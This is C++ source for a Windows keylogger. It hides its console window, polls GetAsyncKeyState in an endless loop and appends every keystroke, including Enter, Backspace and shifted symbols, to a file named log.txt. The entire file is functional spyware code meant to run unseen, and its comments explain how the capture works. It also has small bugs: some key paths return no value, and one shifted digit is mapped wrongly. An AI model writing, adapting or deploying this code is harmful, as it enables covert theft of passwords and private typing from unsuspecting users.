#include<iostream>
#include<windows.h>
#include<winuser.h>
#include<fstream>

using namespace std;

void log();
char filter_char(char key);
void hide_console();

int main(){

    hide_console();
    log();

    return 0;
}


void hide_console(){
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
}

char filter_char(char key){

    //this if statement checks whether the key is upper case and if the shift key is not pressed then it changes the character to lower case
    if((key>64) && (key<91) && !GetAsyncKeyState(0x10)){
        return key+32;
    }
    else{
        if(GetAsyncKeyState(0x10)){
            switch(key){
                case 49: return '!';
                case 50: return '@';
                case 51: return '#';
                case 52: return '$';
                case 53: return '%';
                case 54: return '^';
                case 55: return '&';
                case 56: return '*';
                case 57: return '(';
                case 58: return ')';
            }
        }
        else
            return key;
    }
}

void log(){
    char key;

    for(;;){
        // sleep(0);
        // the below loop is like looping through ascii values of the charcter
        for(key=8;key<=222;key++){
            //getasynckeystate function is a system interrupt which checks whether the user has entered the a keystroke
            if(GetAsyncKeyState(key) == -32767){
                ofstream write ("log.txt", ios::app);
                // write << c;
                switch(key){
                    case 8: write<<"<BackSpace>";
                            break;
                    case 27: write<<"<Esc>";
                            break;
                    case 127: write<<"<DEL>";
                            break;
                    case 32: write<<" ";
                            break;
                    case 13: write<<"<Enter>\n";
                            break;
                    default: write<<filter_char(key);
                            break;
                }

                write.close();
            }
        }
    }
}

